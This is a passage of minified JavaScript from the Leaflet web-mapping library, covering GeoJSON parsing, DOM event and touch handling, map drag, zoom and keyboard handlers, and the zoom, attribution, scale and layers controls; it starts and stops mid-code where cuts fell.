o=this.coordsToLatLngs(l,2),new n.MultiPolygon(o);case"GeometryCollection":for(s=0,a=h.geometries.length;a>s;s++)r=this.geometryToLayer({geometry:h.geometries[s],type:"Feature",properties:t.properties},e),u.push(r);return new n.FeatureGroup(u);default:throw Error("Invalid GeoJSON object.")}},coordsToLatLng:function(t,e){var i=parseFloat(t[e?0:1]),o=parseFloat(t[e?1:0]);return new n.LatLng(i,o)},coordsToLatLngs:function(t,e,i){var n,o,s,a=[];for(o=0,s=t.length;s>o;o++)n=e?this.coordsToLatLngs(t[o],e-1,i):this.coordsToLatLng(t[o],i),a.push(n);return a}}),n.geoJson=function(t,e){return new n.GeoJSON(t,e)},n.DomEvent={addListener:function(t,e,o,s){var a,r,h,l=n.stamp(o),u="_leaflet_"+e+l;return t[u]?this:(a=function(e){return o.call(s||t,e||n.DomEvent._getEvent())},n.Browser.msTouch&&0===e.indexOf("touch")?this.addMsTouchListener(t,e,a,l):(n.Browser.touch&&"dblclick"===e&&this.addDoubleTapListener&&this.addDoubleTapListener(t,a,l),"addEventListener"in t?"mousewheel"===e?(t.addEventListener("DOMMouseScroll",a,!1),t.addEventListener(e,a,!1)):"mouseenter"===e||"mouseleave"===e?(r=a,h="mouseenter"===e?"mouseover":"mouseout",a=function(e){return n.DomEvent._checkMouse(t,e)?r(e):i},t.addEventListener(h,a,!1)):"click"===e&&n.Browser.android?(r=a,a=function(t){return n.DomEvent._filterClick(t,r)},t.addEventListener(e,a,!1)):t.addEventListener(e,a,!1):"attachEvent"in t&&t.attachEvent("on"+e,a),t[u]=a,this))},removeListener:function(t,e,i){var o=n.stamp(i),s="_leaflet_"+e+o,a=t[s];return a?(n.Browser.msTouch&&0===e.indexOf("touch")?this.removeMsTouchListener(t,e,o):n.Browser.touch&&"dblclick"===e&&this.removeDoubleTapListener?this.removeDoubleTapListener(t,o):"removeEventListener"in t?"mousewheel"===e?(t.removeEventListener("DOMMouseScroll",a,!1),t.removeEventListener(e,a,!1)):"mouseenter"===e||"mouseleave"===e?t.removeEventListener("mouseenter"===e?"mouseover":"mouseout",a,!1):t.removeEventListener(e,a,!1):"detachEvent"in t&&t.detachEvent("on"+e,a),t[s]=null,this):this},stopPropagation:function(t){return t.stopPropagation?t.stopPropagation():t.cancelBubble=!0,this},disableClickPropagation:function(t){for(var e=n.DomEvent.stopPropagation,i=n.Draggable.START.length-1;i>=0;i--)n.DomEvent.addListener(t,n.Draggable.START[i],e);return n.DomEvent.addListener(t,"click",e).addListener(t,"dblclick",e)},preventDefault:function(t){return t.preventDefault?t.preventDefault():t.returnValue=!1,this},stop:function(t){return n.DomEvent.preventDefault(t).stopPropagation(t)},getMousePosition:function(t,i){var o=e.body,s=e.documentElement,a=t.pageX?t.pageX:t.clientX+o.scrollLeft+s.scrollLeft,r=t.pageY?t.pageY:t.clientY+o.scrollTop+s.scrollTop,h=new n.Point(a,r);return i?h._subtract(n.DomUtil.getViewportOffset(i)):h},getWheelDelta:function(t){var e=0;return t.wheelDelta&&(e=t.wheelDelta/120),t.detail&&(e=-t.detail/3),e},_checkMouse:function(t,e){var i=e.relatedTarget;if(!i)return!0;try{for(;i&&i!==t;)i=i.parentNode}catch(n){return!1}return i!==t},_getEvent:function(){var e=t.event;if(!e)for(var i=arguments.callee.caller;i&&(e=i.arguments[0],!e||t.Event!==e.constructor);)i=i.caller;return e},_filterClick:function(t,e){var o=n.DomEvent._lastClick&&t.timeStamp-n.DomEvent._lastClick;return o&&o>100&&400>o?(n.DomEvent.stop(t),i):(n.DomEvent._lastClick=t.timeStamp,e(t))}},n.DomEvent.on=n.DomEvent.addListener,n.DomEvent.off=n.DomEvent.removeListener,n.Draggable=n.Class.extend({includes:n.Mixin.Events,statics:{START:n.Browser.touch?["touchstart","mousedown"]:["mousedown"],END:{mousedown:"mouseup",touchstart:"touchend",MSPointerDown:"touchend"},MOVE:{mousedown:"mousemove",touchstart:"touchmove",MSPointerDown:"touchmove"},TAP_TOLERANCE:15},initialize:function(t,e,i){this._element=t,this._dragStartTarget=e||t,this._longPress=i&&!n.Browser.msTouch},enable:function(){if(!this._enabled){for(var t=n.Draggable.START.length-1;t>=0;t--)n.DomEvent.on(this._dragStartTarget,n.Draggable.START[t],this._onDown,this);this._enabled=!0}},disable:function(){if(this._enabled){for(var t=n.Draggable.START.length-1;t>=0;t--)n.DomEvent.off(this._dragStartTarget,n.Draggable.START[t],this._onDown,this);this._enabled=!1,this._moved=!1}},_onDown:function(t){if(!t.shiftKey&&(1===t.which||1===t.button||t.touches)&&(n.DomEvent.preventDefault(t),n.DomEvent.stopPropagation(t),!n.Draggable._disabled)){if(this._simulateClick=!0,t.touches&&t.touches.length>1)return this._simulateClick=!1,clearTimeout(this._longPressTimeout),i;var o=t.touches&&1===t.touches.length?t.touches[0]:t,s=o.target;n.Browser.touch&&"a"===s.tagName.toLowerCase()&&n.DomUtil.addClass(s,"leaflet-active"),this._moved=!1,this._moving||(this._startPoint=new n.Point(o.clientX,o.clientY),this._startPos=this._newPos=n.DomUtil.getPosition(this._element),t.touches&&1===t.touches.length&&n.Browser.touch&&this._longPress&&(this._longPressTimeout=setTimeout(n.bind(function(){var t=this._newPos&&this._newPos.distanceTo(this._startPos)||0;n.Draggable.TAP_TOLERANCE>t&&(this._simulateClick=!1,this._onUp(),this._simulateEvent("contextmenu",o))},this),1e3)),n.DomEvent.on(e,n.Draggable.MOVE[t.type],this._onMove,this),n.DomEvent.on(e,n.Draggable.END[t.type],this._onUp,this))}},_onMove:function(t){if(!(t.touches&&t.touches.length>1)){var e=t.touches&&1===t.touches.length?t.touches[0]:t,i=new n.Point(e.clientX,e.clientY),o=i.subtract(this._startPoint);(o.x||o.y)&&(n.DomEvent.preventDefault(t),this._moved||(this.fire("dragstart"),this._moved=!0,this._startPos=n.DomUtil.getPosition(this._element).subtract(o),n.Browser.touch||(n.DomUtil.disableTextSelection(),this._setMovingCursor())),this._newPos=this._startPos.add(o),this._moving=!0,n.Util.cancelAnimFrame(this._animRequest),this._animRequest=n.Util.requestAnimFrame(this._updatePosition,this,!0,this._dragStartTarget))}},_updatePosition:function(){this.fire("predrag"),n.DomUtil.setPosition(this._element,this._newPos),this.fire("drag")},_onUp:function(t){var i;if(clearTimeout(this._longPressTimeout),this._simulateClick&&t.changedTouches){var o=t.changedTouches[0],s=o.target,a=this._newPos&&this._newPos.distanceTo(this._startPos)||0;"a"===s.tagName.toLowerCase()&&n.DomUtil.removeClass(s,"leaflet-active"),n.Draggable.TAP_TOLERANCE>a&&(i=o)}n.Browser.touch||(n.DomUtil.enableTextSelection(),this._restoreCursor());for(var r in n.Draggable.MOVE)n.Draggable.MOVE.hasOwnProperty(r)&&(n.DomEvent.off(e,n.Draggable.MOVE[r],this._onMove),n.DomEvent.off(e,n.Draggable.END[r],this._onUp));this._moved&&(n.Util.cancelAnimFrame(this._animRequest),this.fire("dragend")),this._moving=!1,i&&(this._moved=!1,this._simulateEvent("click",i))},_setMovingCursor:function(){n.DomUtil.addClass(e.body,"leaflet-dragging")},_restoreCursor:function(){n.DomUtil.removeClass(e.body,"leaflet-dragging")},_simulateEvent:function(i,n){var o=e.createEvent("MouseEvents");o.initMouseEvent(i,!0,!0,t,1,n.screenX,n.screenY,n.clientX,n.clientY,!1,!1,!1,!1,0,null),n.target.dispatchEvent(o)}}),n.Handler=n.Class.extend({initialize:function(t){this._map=t},enable:function(){this._enabled||(this._enabled=!0,this.addHooks())},disable:function(){this._enabled&&(this._enabled=!1,this.removeHooks())},enabled:function(){return!!this._enabled}}),n.Map.mergeOptions({dragging:!0,inertia:!n.Browser.android23,inertiaDeceleration:3400,inertiaMaxSpeed:1/0,inertiaThreshold:n.Browser.touch?32:18,easeLinearity:.25,longPress:!0,worldCopyJump:!1}),n.Map.Drag=n.Handler.extend({addHooks:function(){if(!this._draggable){var t=this._map;this._draggable=new n.Draggable(t._mapPane,t._container,t.options.longPress),this._draggable.on({dragstart:this._onDragStart,drag:this._onDrag,dragend:this._onDragEnd},this),t.options.worldCopyJump&&(this._draggable.on("predrag",this._onPreDrag,this),t.on("viewreset",this._onViewReset,this))}this._draggable.enable()},removeHooks:function(){this._draggable.disable()},moved:function(){return this._draggable&&this._draggable._moved},_onDragStart:function(){var t=this._map;t._panAnim&&t._panAnim.stop(),t.fire("movestart").fire("dragstart"),t.options.inertia&&(this._positions=[],this._times=[])},_onDrag:function(){if(this._map.options.inertia){var t=this._lastTime=+new Date,e=this._lastPos=this._draggable._newPos;this._positions.push(e),this._times.push(t),t-this._times[0]>200&&(this._positions.shift(),this._times.shift())}this._map.fire("move").fire("drag")},_onViewReset:function(){var t=this._map.getSize()._divideBy(2),e=this._map.latLngToLayerPoint(new n.LatLng(0,0));this._initialWorldOffset=e.subtract(t).x,this._worldWidth=this._map.project(new n.LatLng(0,180)).x},_onPreDrag:function(){var t=this._worldWidth,e=Math.round(t/2),i=this._initialWorldOffset,n=this._draggable._newPos.x,o=(n-e+i)%t+e-i,s=(n+e+i)%t-e-i,a=Math.abs(o+i)<Math.abs(s+i)?o:s;this._draggable._newPos.x=a},_onDragEnd:function(){var t=this._map,e=t.options,i=+new Date-this._lastTime,o=!e.inertia||i>e.inertiaThreshold||!this._positions[0];if(t.fire("dragend"),o)t.fire("moveend");else{var s=this._lastPos.subtract(this._positions[0]),a=(this._lastTime+i-this._times[0])/1e3,r=e.easeLinearity,h=s.multiplyBy(r/a),l=h.distanceTo(new n.Point(0,0)),u=Math.min(e.inertiaMaxSpeed,l),c=h.multiplyBy(u/l),_=u/(e.inertiaDeceleration*r),p=c.multiplyBy(-_/2).round();p.x&&p.y?n.Util.requestAnimFrame(function(){t.panBy(p,_,r,!0)}):t.fire("moveend")}e.maxBounds&&n.Util.requestAnimFrame(this._panInsideMaxBounds,t,!0,t._container)},_panInsideMaxBounds:function(){this.panInsideBounds(this.options.maxBounds)}}),n.Map.addInitHook("addHandler","dragging",n.Map.Drag),n.Map.mergeOptions({doubleClickZoom:!0}),n.Map.DoubleClickZoom=n.Handler.extend({addHooks:function(){this._map.on("dblclick",this._onDoubleClick)},removeHooks:function(){this._map.off("dblclick",this._onDoubleClick)},_onDoubleClick:function(t){this.setZoomAround(t.containerPoint,this._zoom+1)}}),n.Map.addInitHook("addHandler","doubleClickZoom",n.Map.DoubleClickZoom),n.Map.mergeOptions({scrollWheelZoom:!0}),n.Map.ScrollWheelZoom=n.Handler.extend({addHooks:function(){n.DomEvent.on(this._map._container,"mousewheel",this._onWheelScroll,this),this._delta=0},removeHooks:function(){n.DomEvent.off(this._map._container,"mousewheel",this._onWheelScroll)},_onWheelScroll:function(t){var e=n.DomEvent.getWheelDelta(t);this._delta+=e,this._lastMousePos=this._map.mouseEventToContainerPoint(t),this._startTime||(this._startTime=+new Date);var i=Math.max(40-(+new Date-this._startTime),0);clearTimeout(this._timer),this._timer=setTimeout(n.bind(this._performZoom,this),i),n.DomEvent.preventDefault(t),n.DomEvent.stopPropagation(t)},_performZoom:function(){var t=this._map,e=this._delta,i=t.getZoom();e=e>0?Math.ceil(e):Math.floor(e),e=Math.max(Math.min(e,4),-4),e=t._limitZoom(i+e)-i,this._delta=0,this._startTime=null,e&&t.setZoomAround(this._lastMousePos,i+e)}}),n.Map.addInitHook("addHandler","scrollWheelZoom",n.Map.ScrollWheelZoom),n.extend(n.DomEvent,{_touchstart:n.Browser.msTouch?"MSPointerDown":"touchstart",_touchend:n.Browser.msTouch?"MSPointerUp":"touchend",addDoubleTapListener:function(t,i,o){function s(t){var e;if(n.Browser.msTouch?(d.push(t.pointerId),e=d.length):e=t.touches.length,!(e>1)){var i=Date.now(),o=i-(r||i);h=t.touches?t.touches[0]:t,l=o>0&&u>=o,r=i}}function a(t){if(n.Browser.msTouch){var e=d.indexOf(t.pointerId);if(-1===e)return;d.splice(e,1)}if(l){if(n.Browser.msTouch){var o,s={};for(var a in h)o=h[a],s[a]="function"==typeof o?o.bind(h):o;h=s}h.type="dblclick",i(h),r=null}}var r,h,l=!1,u=250,c="_leaflet_",_=this._touchstart,p=this._touchend,d=[];t[c+_+o]=s,t[c+p+o]=a;var m=n.Browser.msTouch?e.documentElement:t;return t.addEventListener(_,s,!1),m.addEventListener(p,a,!1),n.Browser.msTouch&&m.addEventListener("MSPointerCancel",a,!1),this},removeDoubleTapListener:function(t,i){var o="_leaflet_";return t.removeEventListener(this._touchstart,t[o+this._touchstart+i],!1),(n.Browser.msTouch?e.documentElement:t).removeEventListener(this._touchend,t[o+this._touchend+i],!1),n.Browser.msTouch&&e.documentElement.removeEventListener("MSPointerCancel",t[o+this._touchend+i],!1),this}}),n.extend(n.DomEvent,{_msTouches:[],_msDocumentListener:!1,addMsTouchListener:function(t,e,i,n){switch(e){case"touchstart":return this.addMsTouchListenerStart(t,e,i,n);case"touchend":return this.addMsTouchListenerEnd(t,e,i,n);case"touchmove":return this.addMsTouchListenerMove(t,e,i,n);default:throw"Unknown touch event type"}},addMsTouchListenerStart:function(t,i,n,o){var s="_leaflet_",a=this._msTouches,r=function(t){for(var e=!1,i=0;a.length>i;i++)if(a[i].pointerId===t.pointerId){e=!0;break}e||a.push(t),t.touches=a.slice(),t.changedTouches=[t],n(t)};if(t[s+"touchstart"+o]=r,t.addEventListener("MSPointerDown",r,!1),!this._msDocumentListener){var h=function(t){for(var e=0;a.length>e;e++)if(a[e].pointerId===t.pointerId){a.splice(e,1);break}};e.documentElement.addEventListener("MSPointerUp",h,!1),e.documentElement.addEventListener("MSPointerCancel",h,!1),this._msDocumentListener=!0}return this},addMsTouchListenerMove:function(t,e,i,n){function o(t){if(t.pointerType!==t.MSPOINTER_TYPE_MOUSE||0!==t.buttons){for(var e=0;a.length>e;e++)if(a[e].pointerId===t.pointerId){a[e]=t;break}t.touches=a.slice(),t.changedTouches=[t],i(t)}}var s="_leaflet_",a=this._msTouches;return t[s+"touchmove"+n]=o,t.addEventListener("MSPointerMove",o,!1),this},addMsTouchListenerEnd:function(t,e,i,n){var o="_leaflet_",s=this._msTouches,a=function(t){for(var e=0;s.length>e;e++)if(s[e].pointerId===t.pointerId){s.splice(e,1);break}t.touches=s.slice(),t.changedTouches=[t],i(t)};return t[o+"touchend"+n]=a,t.addEventListener("MSPointerUp",a,!1),t.addEventListener("MSPointerCancel",a,!1),this},removeMsTouchListener:function(t,e,i){var n="_leaflet_",o=t[n+e+i];switch(e){case"touchstart":t.removeEventListener("MSPointerDown",o,!1);break;case"touchmove":t.removeEventListener("MSPointerMove",o,!1);break;case"touchend":t.removeEventListener("MSPointerUp",o,!1),t.removeEventListener("MSPointerCancel",o,!1)}return this}}),n.Map.mergeOptions({touchZoom:n.Browser.touch&&!n.Browser.android23}),n.Map.TouchZoom=n.Handler.extend({addHooks:function(){n.DomEvent.on(this._map._container,"touchstart",this._onTouchStart,this)},removeHooks:function(){n.DomEvent.off(this._map._container,"touchstart",this._onTouchStart,this)},_onTouchStart:function(t){var i=this._map;if(t.touches&&2===t.touches.length&&!i._animatingZoom&&!this._zooming){var o=i.mouseEventToLayerPoint(t.touches[0]),s=i.mouseEventToLayerPoint(t.touches[1]),a=i._getCenterLayerPoint();this._startCenter=o.add(s)._divideBy(2),this._startDist=o.distanceTo(s),this._moved=!1,this._zooming=!0,this._centerOffset=a.subtract(this._startCenter),i._panAnim&&i._panAnim.stop(),n.DomEvent.on(e,"touchmove",this._onTouchMove,this).on(e,"touchend",this._onTouchEnd,this),n.DomEvent.preventDefault(t)}},_onTouchMove:function(t){if(t.touches&&2===t.touches.length){var e=this._map,i=e.mouseEventToLayerPoint(t.touches[0]),o=e.mouseEventToLayerPoint(t.touches[1]);this._scale=i.distanceTo(o)/this._startDist,this._delta=i._add(o)._divideBy(2)._subtract(this._startCenter),1!==this._scale&&(this._moved||(n.DomUtil.addClass(e._mapPane,"leaflet-touching"),e.fire("movestart").fire("zoomstart"),this._moved=!0),n.Util.cancelAnimFrame(this._animRequest),this._animRequest=n.Util.requestAnimFrame(this._updateOnMove,this,!0,this._map._container),n.DomEvent.preventDefault(t))}},_updateOnMove:function(){var t=this._map,e=this._getScaleOrigin(),i=t.layerPointToLatLng(e),n=t.getScaleZoom(this._scale);t._animateZoom(i,n,this._startCenter,this._scale,this._delta,!0)},_onTouchEnd:function(){if(this._moved&&this._zooming){var t=this._map;this._zooming=!1,n.DomUtil.removeClass(t._mapPane,"leaflet-touching"),n.DomEvent.off(e,"touchmove",this._onTouchMove).off(e,"touchend",this._onTouchEnd);var i=this._getScaleOrigin(),o=t.layerPointToLatLng(i),s=t.getZoom(),a=t.getScaleZoom(this._scale)-s,r=a>0?Math.ceil(a):Math.floor(a),h=t._limitZoom(s+r),l=t.getZoomScale(h)/this._scale;t._animateZoom(o,h,i,l,null,!0)}},_getScaleOrigin:function(){var t=this._centerOffset.subtract(this._delta).divideBy(this._scale);return this._startCenter.add(t)}}),n.Map.addInitHook("addHandler","touchZoom",n.Map.TouchZoom),n.Map.mergeOptions({boxZoom:!0}),n.Map.BoxZoom=n.Handler.extend({initialize:function(t){this._map=t,this._container=t._container,this._pane=t._panes.overlayPane},addHooks:function(){n.DomEvent.on(this._container,"mousedown",this._onMouseDown,this)},removeHooks:function(){n.DomEvent.off(this._container,"mousedown",this._onMouseDown)},_onMouseDown:function(t){return!t.shiftKey||1!==t.which&&1!==t.button?!1:(n.DomUtil.disableTextSelection(),this._startLayerPoint=this._map.mouseEventToLayerPoint(t),this._box=n.DomUtil.create("div","leaflet-zoom-box",this._pane),n.DomUtil.setPosition(this._box,this._startLayerPoint),this._container.style.cursor="crosshair",n.DomEvent.on(e,"mousemove",this._onMouseMove,this).on(e,"mouseup",this._onMouseUp,this).on(e,"keydown",this._onKeyDown,this).preventDefault(t),this._map.fire("boxzoomstart"),i)},_onMouseMove:function(t){var e=this._startLayerPoint,i=this._box,o=this._map.mouseEventToLayerPoint(t),s=o.subtract(e),a=new n.Point(Math.min(o.x,e.x),Math.min(o.y,e.y));n.DomUtil.setPosition(i,a),i.style.width=Math.max(0,Math.abs(s.x)-4)+"px",i.style.height=Math.max(0,Math.abs(s.y)-4)+"px"},_finish:function(){this._pane.removeChild(this._box),this._container.style.cursor="",n.DomUtil.enableTextSelection(),n.DomEvent.off(e,"mousemove",this._onMouseMove).off(e,"mouseup",this._onMouseUp).off(e,"keydown",this._onKeyDown)},_onMouseUp:function(t){this._finish();var e=this._map,i=e.mouseEventToLayerPoint(t);if(!this._startLayerPoint.equals(i)){var o=new n.LatLngBounds(e.layerPointToLatLng(this._startLayerPoint),e.layerPointToLatLng(i));e.fitBounds(o),e.fire("boxzoomend",{boxZoomBounds:o})}},_onKeyDown:function(t){27===t.keyCode&&this._finish()}}),n.Map.addInitHook("addHandler","boxZoom",n.Map.BoxZoom),n.Map.mergeOptions({keyboard:!0,keyboardPanOffset:80,keyboardZoomOffset:1}),n.Map.Keyboard=n.Handler.extend({keyCodes:{left:[37],right:[39],down:[40],up:[38],zoomIn:[187,107,61],zoomOut:[189,109,173]},initialize:function(t){this._map=t,this._setPanOffset(t.options.keyboardPanOffset),this._setZoomOffset(t.options.keyboardZoomOffset)},addHooks:function(){var t=this._map._container;-1===t.tabIndex&&(t.tabIndex="0"),n.DomEvent.on(t,"focus",this._onFocus,this).on(t,"blur",this._onBlur,this).on(t,"mousedown",this._onMouseDown,this),this._map.on("focus",this._addHooks,this).on("blur",this._removeHooks,this)},removeHooks:function(){this._removeHooks();var t=this._map._container;n.DomEvent.off(t,"focus",this._onFocus,this).off(t,"blur",this._onBlur,this).off(t,"mousedown",this._onMouseDown,this),this._map.off("focus",this._addHooks,this).off("blur",this._removeHooks,this)},_onMouseDown:function(){this._focused||this._map._container.focus()},_onFocus:function(){this._focused=!0,this._map.fire("focus")},_onBlur:function(){this._focused=!1,this._map.fire("blur")},_setPanOffset:function(t){var e,i,n=this._panKeys={},o=this.keyCodes;for(e=0,i=o.left.length;i>e;e++)n[o.left[e]]=[-1*t,0];for(e=0,i=o.right.length;i>e;e++)n[o.right[e]]=[t,0];for(e=0,i=o.down.length;i>e;e++)n[o.down[e]]=[0,t];for(e=0,i=o.up.length;i>e;e++)n[o.up[e]]=[0,-1*t]},_setZoomOffset:function(t){var e,i,n=this._zoomKeys={},o=this.keyCodes;for(e=0,i=o.zoomIn.length;i>e;e++)n[o.zoomIn[e]]=t;for(e=0,i=o.zoomOut.length;i>e;e++)n[o.zoomOut[e]]=-t},_addHooks:function(){n.DomEvent.on(e,"keydown",this._onKeyDown,this)},_removeHooks:function(){n.DomEvent.off(e,"keydown",this._onKeyDown,this)},_onKeyDown:function(t){var e=t.keyCode,i=this._map;if(this._panKeys.hasOwnProperty(e))i.panBy(this._panKeys[e]),i.options.maxBounds&&i.panInsideBounds(i.options.maxBounds);else{if(!this._zoomKeys.hasOwnProperty(e))return;i.setZoom(i.getZoom()+this._zoomKeys[e])}n.DomEvent.stop(t)}}),n.Map.addInitHook("addHandler","keyboard",n.Map.Keyboard),n.Handler.MarkerDrag=n.Handler.extend({initialize:function(t){this._marker=t},addHooks:function(){var t=this._marker._icon;this._draggable||(this._draggable=new n.Draggable(t,t)),this._draggable.on("dragstart",this._onDragStart,this).on("drag",this._onDrag,this).on("dragend",this._onDragEnd,this),this._draggable.enable()},removeHooks:function(){this._draggable.off("dragstart",this._onDragStart).off("drag",this._onDrag).off("dragend",this._onDragEnd),this._draggable.disable()},moved:function(){return this._draggable&&this._draggable._moved},_onDragStart:function(){this._marker.closePopup().fire("movestart").fire("dragstart")},_onDrag:function(){var t=this._marker,e=t._shadow,i=n.DomUtil.getPosition(t._icon),o=t._map.layerPointToLatLng(i);e&&n.DomUtil.setPosition(e,i),t._latlng=o,t.fire("move",{latlng:o}).fire("drag")},_onDragEnd:function(){this._marker.fire("moveend").fire("dragend")}}),n.Control=n.Class.extend({options:{position:"topright"},initialize:function(t){n.setOptions(this,t)},getPosition:function(){return this.options.position},setPosition:function(t){var e=this._map;return e&&e.removeControl(this),this.options.position=t,e&&e.addControl(this),this},getContainer:function(){return this._container},addTo:function(t){this._map=t;var e=this._container=this.onAdd(t),i=this.getPosition(),o=t._controlCorners[i];return n.DomUtil.addClass(e,"leaflet-control"),-1!==i.indexOf("bottom")?o.insertBefore(e,o.firstChild):o.appendChild(e),this},removeFrom:function(t){var e=this.getPosition(),i=t._controlCorners[e];return i.removeChild(this._container),this._map=null,this.onRemove&&this.onRemove(t),this}}),n.control=function(t){return new n.Control(t)},n.Map.include({addControl:function(t){return t.addTo(this),this},removeControl:function(t){return t.removeFrom(this),this},_initControlPos:function(){function t(t,s){var a=i+t+" "+i+s;e[t+s]=n.DomUtil.create("div",a,o)}var e=this._controlCorners={},i="leaflet-",o=this._controlContainer=n.DomUtil.create("div",i+"control-container",this._container);t("top","left"),t("top","right"),t("bottom","left"),t("bottom","right")}}),n.Control.Zoom=n.Control.extend({options:{position:"topleft"},onAdd:function(t){var e="leaflet-control-zoom",i=n.DomUtil.create("div",e+" leaflet-bar");return this._map=t,this._zoomInButton=this._createButton("+","Zoom in",e+"-in",i,this._zoomIn,this),this._zoomOutButton=this._createButton("-","Zoom out",e+"-out",i,this._zoomOut,this),t.on("zoomend zoomlevelschange",this._updateDisabled,this),i},onRemove:function(t){t.off("zoomend zoomlevelschange",this._updateDisabled,this)},_zoomIn:function(t){this._map.zoomIn(t.shiftKey?3:1)},_zoomOut:function(t){this._map.zoomOut(t.shiftKey?3:1)},_createButton:function(t,e,i,o,s,a){var r=n.DomUtil.create("a",i,o);r.innerHTML=t,r.href="#",r.title=e;var h=n.DomEvent.stopPropagation;return n.DomEvent.on(r,"click",h).on(r,"mousedown",h).on(r,"dblclick",h).on(r,"click",n.DomEvent.preventDefault).on(r,"click",s,a),r},_updateDisabled:function(){var t=this._map,e="leaflet-disabled";n.DomUtil.removeClass(this._zoomInButton,e),n.DomUtil.removeClass(this._zoomOutButton,e),t._zoom===t.getMinZoom()&&n.DomUtil.addClass(this._zoomOutButton,e),t._zoom===t.getMaxZoom()&&n.DomUtil.addClass(this._zoomInButton,e)}}),n.Map.mergeOptions({zoomControl:!0}),n.Map.addInitHook(function(){this.options.zoomControl&&(this.zoomControl=new n.Control.Zoom,this.addControl(this.zoomControl))}),n.control.zoom=function(t){return new n.Control.Zoom(t)},n.Control.Attribution=n.Control.extend({options:{position:"bottomright",prefix:'Leaflet'},initialize:function(t){n.setOptions(this,t),this._attributions={}},onAdd:function(t){return this._container=n.DomUtil.create("div","leaflet-control-attribution"),n.DomEvent.disableClickPropagation(this._container),t.on("layeradd",this._onLayerAdd,this).on("layerremove",this._onLayerRemove,this),this._update(),this._container},onRemove:function(t){t.off("layeradd",this._onLayerAdd).off("layerremove",this._onLayerRemove)},setPrefix:function(t){return this.options.prefix=t,this._update(),this},addAttribution:function(t){return t?(this._attributions[t]||(this._attributions[t]=0),this._attributions[t]++,this._update(),this):i},removeAttribution:function(t){return t?(this._attributions[t]&&(this._attributions[t]--,this._update()),this):i},_update:function(){if(this._map){var t=[];for(var e in this._attributions)this._attributions.hasOwnProperty(e)&&this._attributions[e]&&t.push(e);var i=[];this.options.prefix&&i.push(this.options.prefix),t.length&&i.push(t.join(", ")),this._container.innerHTML=i.join(" | ")}},_onLayerAdd:function(t){t.layer.getAttribution&&this.addAttribution(t.layer.getAttribution())},_onLayerRemove:function(t){t.layer.getAttribution&&this.removeAttribution(t.layer.getAttribution())}}),n.Map.mergeOptions({attributionControl:!0}),n.Map.addInitHook(function(){this.options.attributionControl&&(this.attributionControl=(new n.Control.Attribution).addTo(this))}),n.control.attribution=function(t){return new n.Control.Attribution(t)},n.Control.Scale=n.Control.extend({options:{position:"bottomleft",maxWidth:100,metric:!0,imperial:!0,updateWhenIdle:!1},onAdd:function(t){this._map=t;var e="leaflet-control-scale",i=n.DomUtil.create("div",e),o=this.options;return this._addScales(o,e,i),t.on(o.updateWhenIdle?"moveend":"move",this._update,this),t.whenReady(this._update,this),i},onRemove:function(t){t.off(this.options.updateWhenIdle?"moveend":"move",this._update,this)},_addScales:function(t,e,i){t.metric&&(this._mScale=n.DomUtil.create("div",e+"-line",i)),t.imperial&&(this._iScale=n.DomUtil.create("div",e+"-line",i))},_update:function(){var t=this._map.getBounds(),e=t.getCenter().lat,i=6378137*Math.PI*Math.cos(e*Math.PI/180),n=i*(t.getNorthEast().lng-t.getSouthWest().lng)/180,o=this._map.getSize(),s=this.options,a=0;o.x>0&&(a=n*(s.maxWidth/o.x)),this._updateScales(s,a)},_updateScales:function(t,e){t.metric&&e&&this._updateMetric(e),t.imperial&&e&&this._updateImperial(e)},_updateMetric:function(t){var e=this._getRoundNum(t);this._mScale.style.width=this._getScaleWidth(e/t)+"px",this._mScale.innerHTML=1e3>e?e+" m":e/1e3+" km"},_updateImperial:function(t){var e,i,n,o=3.2808399*t,s=this._iScale;o>5280?(e=o/5280,i=this._getRoundNum(e),s.style.width=this._getScaleWidth(i/e)+"px",s.innerHTML=i+" mi"):(n=this._getRoundNum(o),s.style.width=this._getScaleWidth(n/o)+"px",s.innerHTML=n+" ft")},_getScaleWidth:function(t){return Math.round(this.options.maxWidth*t)-10},_getRoundNum:function(t){var e=Math.pow(10,(Math.floor(t)+"").length-1),i=t/e;return i=i>=10?10:i>=5?5:i>=3?3:i>=2?2:1,e*i}}),n.control.scale=function(t){return new n.Control.Scale(t)},n.Control.Layers=n.Control.extend({options:{collapsed:!0,position:"topright",autoZIndex:!0},initialize:function(t,e,i){n.setOptions(this,i),this._layers={},this._lastZIndex=0,this._handlingClick=!1;for(var o in t)t.hasOwnProperty(o)&&this._addLayer(t[o],o);for(o in e)e.hasOwnProperty(o)&&this._addLayer(e[o],o,!0)},onAdd:function(t){return this._initLayout(),this._update(),t.on("layeradd",this._onLayerChange,this).on("layerremove",this._onLayerChange,this),this._container},onRemove:function(t){t.off("layeradd",this._onLayerChange).off("layerremove",this._onLayerChange)},addBaseLayer:function(t,e){return this._addLayer(t,e),this._update(),this},addOverlay:function(t,e){return this._addLayer(t,e,!0),this._update(),this},removeLayer:function(t){var e=n.stamp(t);return delete this._layers[e],this._update(),this},_initLayout:function(){var t="leaflet-control-layers",e=this._container=n.DomUtil.create("div",t);n.Browser.touch?n.DomEvent.on(e,"click",n.DomEvent.stopPropagation):(n.DomEvent.disableClickPropagation(e),n.DomEvent.on(e,"mousewheel",n.DomEvent.stopPropagation));var i=this._form=n.DomUtil.create("form",t+"-list");if(this.options.collapsed){n.DomEvent.on(e,"mouseover",this._expand,this).on(e,"mouseout",this._collapse,this);var o=this._layersLink=n.DomUtil.create("a",t+"-toggle",e);o.href="#",o.title="Layers",n.Browser.touch?n.DomEvent.on(o,"click",n.DomEvent.stopPropagation).on(o,"click",n.DomEvent.preventDefault).on(o,"click",this._expand,this):n.DomEvent.on(o,"focus",this._expand,this),this._map.on("movestart",this._collapse,this)}else this._expand();this._baseLayersList=n.DomUtil.create("div",t+"-base",i),this._separator=n.DomUtil.create("div",t+"-separator",i),this._overlaysList=n.DomUtil.create("div",t+"-overlays",i),e.appendChild(i)},_addLayer:function(t,e,i){var o=n.stamp(t);this._layers[o]={layer:t,name:e,overlay:i},this.options.autoZIndex&&t.setZIndex&&(this._lastZIndex++,t.setZIndex(this._lastZIndex))},_update:function(){if(this._container){this._baseLayersList.innerHTML="",this._overlaysList.innerHTML="";var t=!1,e=!1;for(var i in this._layers)if(this._layers.hasOwnProperty(i)){var n=this._layers[i];this._addItem(n),e=e||n.overlay,t=t||!n.overlay}this._separator.style.display=e&&t?"":"none"}},_onLayerChange:function(t){var e=n.stamp(t.layer);this._layers[e]&&!this._handlingClick&&this._update()},_createRadioElement:function(t,i){var n='<input type="radio" class="leaflet-control-layers-selector" name="'+t+'"';i&&(n+=' 